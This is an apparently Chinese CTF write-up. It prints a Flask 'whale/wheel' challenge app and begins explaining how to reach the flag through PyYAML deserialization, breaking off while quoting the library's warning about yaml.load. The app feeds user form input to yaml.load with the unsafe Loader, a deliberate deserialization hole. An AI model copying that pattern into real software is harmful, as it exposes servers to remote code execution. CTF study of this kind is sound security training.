<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">web.py</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;yaml<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">from</span>&nbsp;flask&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;redirect,&nbsp;Flask,&nbsp;render_template,&nbsp;request,&nbsp;abort<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">from</span>&nbsp;flask&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;url_for,&nbsp;send_from_directory,&nbsp;make_response,&nbsp;Response<br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">import</span>&nbsp;flag<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>app&nbsp;=&nbsp;Flask(__name__)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>EASTER_WHALE&nbsp;=&nbsp;{<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;name&quot;</span>:&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;TheBestWhaleIsAWhaleEveryOneLikes&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;image_num&quot;</span>:&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">2</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;weight&quot;</span>:&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">34</span>}<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">@app.route(&quot;/&quot;)</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">index</span>():</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;index.html.jinja&quot;</span>,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;home&quot;</span>)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">class&nbsp;<span style="line-height: 26px;">Whale</span>:</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">__init__</span>(self,&nbsp;name,&nbsp;image_num,&nbsp;weight):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.name&nbsp;=&nbsp;name<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.image_num&nbsp;=&nbsp;image_num<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.weight&nbsp;=&nbsp;weight<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">dump</span>(self):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;yaml.dump(self.__dict__)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">@app.route(&quot;/whale&quot;,&nbsp;methods=[&quot;GET&quot;,&nbsp;&quot;POST&quot;])</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">whale</span>():</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;request.method&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;POST&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;=&nbsp;request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;name&quot;</span>]<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;长度限制&nbsp;10</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;len(name)&nbsp;&gt;&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">10</span>:&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;Name&nbsp;to&nbsp;long.&nbsp;Whales&nbsp;can&nbsp;only&nbsp;understand&nbsp;names&nbsp;up&nbsp;to&nbsp;10&nbsp;chars&quot;</span>,&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">400</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;image_num&nbsp;=&nbsp;request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;image_num&quot;</span>]<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;weight&nbsp;=&nbsp;request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;weight&quot;</span>]<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;whale&nbsp;=&nbsp;Whale(name,&nbsp;image_num,&nbsp;weight)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;getflag&nbsp;注意这里</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;whale.__dict__&nbsp;==&nbsp;EASTER_WHALE:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(flag.get_flag(),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;whale.html.jinja&quot;</span>,&nbsp;w=whale,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;whale&quot;</span>),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;whale_builder.html.jinja&quot;</span>,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;whale&quot;</span>),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">class&nbsp;<span style="line-height: 26px;">Wheel</span>:</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">__init__</span>(self,&nbsp;name,&nbsp;image_num,&nbsp;diameter):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.name&nbsp;=&nbsp;name<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.image_num&nbsp;=&nbsp;image_num<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.diameter&nbsp;=&nbsp;diameter<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&nbsp;&nbsp;&nbsp;&nbsp;@staticmethod</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">from_configuration</span>(config):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;Wheel(**yaml.load(config,&nbsp;Loader=yaml.Loader))<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">dump</span>(self):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;yaml.dump(self.__dict__)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">@app.route(&quot;/wheel&quot;,&nbsp;methods=[&quot;GET&quot;,&nbsp;&quot;POST&quot;])</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">wheel</span>():</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;request.method&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;POST&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;config&quot;</span>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;request.form:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;=&nbsp;Wheel.from_configuration(request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;config&quot;</span>])<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel.html.jinja&quot;</span>,&nbsp;w=wheel,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel&quot;</span>),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name&nbsp;=&nbsp;request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;name&quot;</span>]<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;image_num&nbsp;=&nbsp;request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;image_num&quot;</span>]<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;diameter&nbsp;=&nbsp;request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;diameter&quot;</span>]<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;=&nbsp;Wheel(name,&nbsp;image_num,&nbsp;diameter)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(wheel.dump())<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel.html.jinja&quot;</span>,&nbsp;w=wheel,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel&quot;</span>),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel_builder.html.jinja&quot;</span>,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel&quot;</span>),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;__name__&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;__main__&#39;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;app.run(host=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;0.0.0.0&quot;</span>,&nbsp;port=<span style="box-sizing: border-box;color: #008080;line-height: 26px;">5000</span>)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: justify;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">flask 框架，yaml 序列化。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: justify;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">整体逻辑很简单，wheel 和 whale 两个类，whale 需要我们创建属性值与&nbsp;</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">EASTER_WHALE</span></code><span style="font-size: 15px;">&nbsp;相同的类对象，但 name 属性明显过不了 if ，长度限制 10 。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: justify;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">wheel 就没有这么多限制，而且我们注意到，除了用构造函数创建 wheel 实例外，还有这段：</span></p>
<pre style="box-sizing: border-box;font-size: 16px;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;color: rgb(0, 0, 0);text-align: left;background-color: rgb(255, 255, 255);"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;line-height: 26px;">class&nbsp;<span style="line-height: 26px;">Wheel</span>:</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;...<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&nbsp;&nbsp;&nbsp;&nbsp;@staticmethod</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">from_configuration</span>(config):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;Wheel(**yaml.load(config,&nbsp;Loader=yaml.Loader))<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">dump</span>(self):</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;yaml.dump(self.__dict__)<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">@app.route(&quot;/wheel&quot;,&nbsp;methods=[&quot;GET&quot;,&nbsp;&quot;POST&quot;])</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;line-height: 26px;">def&nbsp;<span style="line-height: 26px;">wheel</span>():</span><br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;request.method&nbsp;==&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;POST&quot;</span>:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">if</span>&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;config&quot;</span>&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">in</span>&nbsp;request.form:<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;=&nbsp;Wheel.from_configuration(request.form[<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;config&quot;</span>])<br style="box-sizing: border-box;"/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;font-weight: bold;line-height: 26px;">return</span>&nbsp;make_response(render_template(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel.html.jinja&quot;</span>,&nbsp;w=wheel,&nbsp;active=<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&quot;wheel&quot;</span>),&nbsp;<span style="box-sizing: border-box;color: #008080;line-height: 26px;">200</span>)<br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: rgb(0, 0, 0);font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size: 15px;">我们结合&nbsp;</span><span style="font-size: 15px;">Pyyaml 官方文档</span><span style="font-size: 15px;">&nbsp;来理解一下上述代码做了什么，有何利用点：</span></p>
<blockquote style="box-sizing: border-box;margin-top: 20px;margin-bottom: 20px;border-top: none;border-right: none;border-bottom: none;border-left-color: rgba(0, 0, 0, 0.4);font-size: 0.9em;overflow: auto;background: rgba(0, 0, 0, 0.05);color: rgb(106, 115, 125);padding: 10px 10px 10px 20px;font-family: Optima-Regular, Optima, PingFangSC-light, PingFangTC-light, &quot;PingFang SC&quot;, Cambria, Cochin, Georgia, Times, &quot;Times New Roman&quot;, serif;text-align: left;white-space: normal;"><p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.dump(data, Dumper=Dumper)</span></code></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.dump</span></code><span style="font-size: 15px;">&nbsp;函数接受一个 Python 对象并生成一个 YAML 文档。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load(stream, Loader=Loader)</span></code></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;函数将 YAML 文档转换为 Python 对象，返回一个 Python 对象。</span></p>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;接受一个字节字符串、一个 Unicode 字符串、一个打开的二进制文件对象或一个打开的文本文件对象。字节字符串或文件必须使用 utf-8、 utf-16-be 或 utf-16-le 编码进行编码。</span><code style="box-sizing: border-box;font-size: 14px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;overflow-wrap: break-word;padding: 2px 4px;border-radius: 4px;margin-right: 2px;margin-left: 2px;color: rgb(30, 107, 184);background-color: rgba(27, 31, 35, 0.05);word-break: break-all;"><span style="font-size: 15px;">yaml.load</span></code><span style="font-size: 15px;">&nbsp;通过检查字符串/文件开头的 BOM (字节顺序标记) 序列来检测编码。如果没有提供 BOM，则假定采用 utf-8编码。</span></p>
<pre style="box-sizing: border-box;font-size: 1em;font-family: SFMono-Regular, Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;margin-top: 10px;margin-bottom: 10px;overflow: auto;border-radius: 5px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 10px;"><code style="box-sizing: border-box;font-size: 12px;font-family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;display: -webkit-box;overflow-x: auto;padding: 15px 16px 16px;color: rgb(51, 51, 51);background: rgb(248, 248, 248);border-radius: 5px;"><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&gt;&gt;&gt;&nbsp;</span>yaml.load(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">u&quot;&quot;&quot;<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>hello:&nbsp;Привет!<br style="box-sizing: border-box;"/><span style="line-height: 26px;">...&nbsp;</span>&quot;&quot;&quot;</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;In&nbsp;Python&nbsp;3,&nbsp;do&nbsp;not&nbsp;use&nbsp;the&nbsp;&#39;u&#39;&nbsp;prefix</span><br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/>{<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;hello&#39;</span>:&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">u&#39;u041fu0440u0438u0432u0435u0442!&#39;</span>}<br style="box-sizing: border-box;"/><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&gt;&gt;&gt;&nbsp;</span>stream&nbsp;=&nbsp;file(<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;document.yaml&#39;</span>,&nbsp;<span style="box-sizing: border-box;color: #DD1144;line-height: 26px;">&#39;r&#39;</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;&#39;document.yaml&#39;&nbsp;contains&nbsp;a&nbsp;single&nbsp;YAML&nbsp;document.</span><br style="box-sizing: border-box;"/><span style="box-sizing: border-box;color: #999999;font-weight: bold;line-height: 26px;">&gt;&gt;&gt;&nbsp;</span>yaml.load(stream)<br style="box-sizing: border-box;"/>[...]&nbsp;&nbsp;&nbsp;&nbsp;<span style="box-sizing: border-box;color: #999988;font-style: italic;line-height: 26px;">#&nbsp;A&nbsp;Python&nbsp;object&nbsp;corresponding&nbsp;to&nbsp;the&nbsp;document.</span><br style="box-sizing: border-box;"/></code></pre>
<p style="box-sizing: border-box;font-size: 16px;padding-top: 8px;padding-bottom: 8px;line-height: 26px;color: black;"><span style="font-size: 15px;">对于这个函数，官方也有警告：</span></p>
